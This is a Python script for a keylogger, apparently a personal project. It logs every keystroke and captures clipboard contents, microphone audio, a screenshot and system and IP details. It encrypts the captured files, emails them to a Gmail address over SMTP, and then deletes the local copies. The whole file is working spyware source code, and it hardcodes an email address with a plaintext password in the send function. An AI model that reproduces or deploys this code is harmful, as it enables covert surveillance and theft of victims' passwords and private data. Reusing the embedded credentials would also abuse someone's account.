#Importing Libraries
from ssl import ALERT_DESCRIPTION_BAD_CERTIFICATE
import sys
import os
import socket
import platform
import time
from urllib.request import AbstractDigestAuthHandler
import pynput
import pyscreenshot as Imagegrab
from requests import get
import win32clipboard
import sounddevice as sd
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet

#Creating Instance of files
key = "DBLsxNY7NlUoEF8RHnP8hznDO7z72yrNqEmIf6at4iw="

keys_info = "keys.txt"
system_info = "system.txt"
audio_info = "audio.wav"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"



file_path = "C:\\Users\KeshavG\\Scripts\\Keylogger_Project\\"
files = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]

#Send Mail
def send_mail(filename, attachment):
    fromaddr = "keshav.45.g@gmail.com"
    toaddr = "keshav.45.g@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Details"

    body = "Body"

    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, "rb")
  
    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())
    encoders.encode_base64(p)
   
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "Keshav@3445") #mr.anon.key@gmail.com #anonkeylogger
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)  
    s.quit()

#Get System Info
def computer_info():
    with open(file_path + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP = " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get public IP")

        f.write("Processor: " + (platform.processor() + '\n'))
        f.write("System: " + (platform.system()) + '\n')
        f.write("Machine: " + (platform.machine()) + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
computer_info()
#send_mail(system_info, file_path + system_info)
       
#Copy from cilpboard
def clipboard():
    with open(file_path + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Copied Data: " + pasted_data)
        except:
            f.write("Clipboard cannot be copied")
clipboard()
#send_mail(clipboard_info, file_path + clipboard_info)

#Record Audio
def microphone():
    fs = 44100
    duration = 20
    myrec = sd.rec(int(duration * fs), samplerate=fs, channels= 2)
    sd.wait()

    write(file_path + audio_info, rate= fs, data= myrec)
microphone()
#send_mail(audio_info, file_path + audio_info)

#Get Screenshot
def screenshot():
    img = Imagegrab.grab()
    img.save(file_path + screenshot_info)
screenshot()
#send_mail(screenshot_info, file_path + screenshot_info)

#Log Keys
keys = []
count = 0

def on_press(key):
    global keys, count, current_window
    
    keys.append(key)
    count += 1
    #process_info = get_current_process()
    #print ("\n\n%s - %s" % (process_info[0], process_info[1]))
    print("{0} pressed".format(key))
    #print(keys)
    

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

#Store keys into file
def write_file(keys):
    with open(file_path + keys_info, "a") as f:
        try:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("enter") > 0:
                    f.write("\n")
                #elif k.find("backspace") > 0:
                    #f.write("\b")
                elif k.find("Key") == -1:
                    f.write(str(k))
                    #f.close()
        except:
            print("Unexpected error: ", sys.exc_info())

def on_release(key):
    if key == Key.esc:
        #send_mail(keys_info, file_path + keys_info)
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 

time.sleep(20)

#Encrypting files
encrypted_files_names = [file_path + keys_info, file_path + system_info, file_path + audio_info, file_path + clipboard_info, file_path + screenshot_info]

count = 0
try:
    for encrypting_file in files:
        with open(files[count], 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
        with open(files[count], 'wb') as f:
            f.write(encrypted)
        send_mail(encrypted_files_names[count], encrypted_files_names[count])
        count += 1
except:
    print("Unexpected error: ", sys.exc_info())

time.sleep(120)

#Delete files
files = [keys_info, system_info, audio_info, clipboard_info, screenshot_info]
for file in files:
    os.remove(file_path + file)
